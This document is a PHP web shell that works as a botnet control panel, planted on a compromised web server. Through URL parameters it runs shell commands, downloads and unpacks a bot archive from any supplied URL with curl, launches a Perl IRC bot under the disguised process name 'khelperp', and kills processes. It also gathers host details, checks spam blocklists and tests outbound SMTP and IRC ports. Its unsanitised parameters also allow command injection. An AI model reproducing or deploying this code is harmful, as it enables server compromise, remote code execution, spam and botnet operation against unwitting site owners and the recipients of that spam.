<body bgcolor="black" text="green">

<br /><br />
<?php

if ($_GET[action] =="clear") { shell_exec('rm -rf bot*'); echo "removed"; }

if ($_GET[action] =="force") {

	$force_url = $_GET[url];

	shell_exec("curl -o bot.tar.gz $force_url");
	shell_exec("tar -zxvf bot.tar.gz");

	
}


$base =  basename($_SERVER['PHP_SELF']);

$chk_system = shell_exec('uname');
$chk_arch = shell_exec('uname -m');
$chk_mem = shell_exec('cat /proc/meminfo |head -n 1'); $chk_mem = str_replace("MemTotal:", "", $chk_mem);
$chk_ip = $_SERVER['SERVER_ADDR'];;
$chk_pub_ip = shell_exec('curl ipinfo.io/ip');
$chk_host = gethostbyaddr($chk_ip);
$chk_pub_ip = chop($chk_pub_ip);
$chk_pub_host = gethostbyaddr($chk_pub_ip);
$chk_date = shell_exec('date');
$chk_perl = shell_exec('whereis perl');
$chk_uptime = shell_exec('uptime -p');
$chk_pwd = shell_exec('pwd');

if (isset($_GET[server])) {

	$ircserv = $_GET[server];
	$ircserv = chop($ircserv);
	$chk_process = shell_exec('ps ax |grep khelperp |grep -v grep |wc -l | awk \'{print $1}\''); $chk_process = chop($chk_process);
	if ($chk_process =='0') {
		shell_exec("cd .bot ; ./bot.pl $ircserv > /dev/null &");
	}
}

if ($_GET[action] =="stop") {
	#shell_exec('killall bot.pl');

	$kill = shell_exec('ps ax |grep khelperp |grep -v grep |awk \'{print $1}\'');
	$kill = chop($kill);
	$kill = shell_exec("kill -9 $kill");

}

function downloadFile ($url, $path) {
  $newfname = $path;
  $file = fopen ($url, "rb");
  if ($file) {
    $newf = fopen ($newfname, "wb");
    if ($newf)
    while(!feof($file)) {
      fwrite($newf, fread($file, 1024 * 8 ), 1024 * 8 );
    }
  }
  if ($file) {
    fclose($file);
  }
  if ($newf) {
    fclose($newf);
  }
} 


if (isset($_GET[ip_bot])) {

	downloadFile("$_GET[ip_bot]", "bot.tar.gz");
	$unpack = shell_exec("tar -zxvf bot.tar.gz");
	unlink("bot.tar.gz");

if (!file_exists('.bot')) {

        $force_url = $_GET[ip_bot];

        shell_exec("curl -o bot.tar.gz $force_url");
        shell_exec("tar -zxvf bot.tar.gz");
	
}


}

function rrmdir($src) {
    $dir = opendir($src);
    while(false !== ( $file = readdir($dir)) ) {
        if (( $file != '.' ) && ( $file != '..' )) {
            $full = $src . '/' . $file;
            if ( is_dir($full) ) {
                rrmdir($full);
            }
            else {
                unlink($full);
            }
        }
    }
    closedir($dir);
    rmdir($src);
}

if ($_GET[action] =="bot_remove") { rrmdir(".bot"); unlink("bot.tar.gz"); }
 

function dnsbllookup($ip)
{
    // Add your preferred list of DNSBL's



#   $dnsbl_lookup = ["zen.spamhaus.org","bl.spamcop.net","sbl.spamhaus.org","xbl.spamhaus.org"];

    $listed = "";
    if ($ip) {
	$reverse_ip = implode(".", array_reverse(explode(".", $ip)));
        foreach ($dnsbl_lookup as $host) {
            if (checkdnsrr($reverse_ip . "." . $host . ".", "A")) {
                $listed .= $reverse_ip . '.' . $host . ' <font color="red">Listed</font><br />';
            }
	}
    }
    if (empty($listed)) {
        # echo '"A" record was not found';
    } else {
	return 1;
    }
}

$spamhaus = dnsbllookup($chk_pub_ip);

if ($spamhaus =="1") { $chk_spamhaus = "<span style=\"color: red;\">Exists</span>"; } else { $chk_spamhaus = "Ok"; }

$connection = @fsockopen('212.77.101.1', '25', $errno, $errstr, 5);
$connection2 = @fsockopen('150.254.65.52', '6667', $errno, $errstr, 5);


if (is_resource($connection)) { $chk_port = "Open"; } else { $chk_port = "<p style=\"color: red;\">Error</p>"; }

if (is_resource($connection2)) { $chk_port2 = "Open"; } else { $chk_port2 = "<p style=\"color: red;\">Error</p>"; }

echo "<table><tr><td style=\"width: 200px;\">System: </td><td><strong>$chk_system ( $chk_arch )</strong></td></tr>";

$test = shell_exec('/usr/bin/mkdir -p /tmp/test2');


if (file_exists('.bot')) { $chk_process = shell_exec('ps ax |grep khelperp |grep -v grep |wc -l| awk \'{print $1}\''); $chk_process = chop($chk_process); $bot_exists = "1"; $chk_bot_exists = "YES &nbsp; <a href=\"$base?action=bot_remove\"><input 
type=\"button\" value=\"Remove\"></a>"; } else { $chk_bot_exists = "<p style=\"color: red;\">NO</p>"; }
if ($bot_exists =="1") { $runnow = "<form action=\"$base\" method=\"GET\" name=\"start\"><p style=\"color: red;\">NO &nbsp;&nbsp; <input type=\"text\" name=\"server\" value=\"\"> &nbsp; <a href=\"$base?action=bot_run_now\"><input type=\"submit\" value=\"Run Now\"></a></form>"; } else { $runnow = "<p style=\"color: red;\">NO</p>"; }

if ($chk_process >= "1") { 
	$chk_bot_running = "YES &nbsp; <a href=\"$base?action=stop\"><input type=\"button\" value=\"STOP\"></a>";
} else {
	$chk_bot_running = "$runnow</p>";
}

echo "<tr><td style=\"width: 200px;\">Memory: </td><td><strong>$chk_mem</strong><td></tr>";
echo "<tr><td style=\"width: 200px;\">Ip: </td><td><strong>$chk_ip ( $chk_host )</strong><td></tr>";
echo "<tr><td style=\"width: 200px;\">Pub Ip: </td><td><strong>$chk_pub_ip ( $chk_pub_host )</strong><td></tr>";
echo "<tr><td style=\"width: 200px;\">Perl: </td><td><strong>$chk_perl</strong><td></tr>";
echo "<tr><td style=\"width: 200px;\">Date/Uptime: </td><td><strong>$chk_date ( $chk_uptime )</strong><td></tr>";
echo "<tr><td style=\"width: 200px;\">PWD: </td><td><strong>$chk_pwd</strong><td></tr>";
echo "<tr><td style=\"width: 200px;\">DBL check: </td><td><strong>$chk_spamhaus</strong><td></tr>";
echo "<tr><td style=\"width: 200px;\">SMTP-Port: </td><td><strong>$chk_port</strong><td></tr>";
echo "<tr><td style=\"width: 200px;\">IRC-Port: </td><td><strong>$chk_port2</strong><td></tr>";
echo "<tr><td style=\"width: 200px;\"> &nbsp; </td><td><strong></strong><td></tr>";
echo "<tr><td style=\"width: 200px;\"> &nbsp; </td><td><strong></strong><td></tr>";

echo "<tr><td style=\"width: 200px;\">BOT Exists: </td><td><strong>$chk_bot_exists</strong><td></tr>";
echo "<tr><td style=\"width: 200px;\"> &nbsp; </td><td><strong></strong><td></tr>";
echo "<tr><td style=\"width: 200px;\">BOT Running: </td><td><strong>$chk_bot_running</strong><td></tr>";
echo "<tr><td style=\"width: 200px;\"> &nbsp; </td><td><strong></strong><td></tr>";

echo "<tr><td style=\"width: 200px;\"> &nbsp; </td><td><strong></strong><td></tr>";
echo "<form action=\"$base?action=getbot\" method=\"get\">";
echo "<tr><td style=\"width: 200px;\">Install BOT URL: </td><td><strong><input type=\"text\" name=\"ip_bot\" style=\"width: 350px;\" value=\"http://\"> &nbsp; <input type=\"submit\" value=\"INSTALL NOW\"></form></strong><td></tr>";

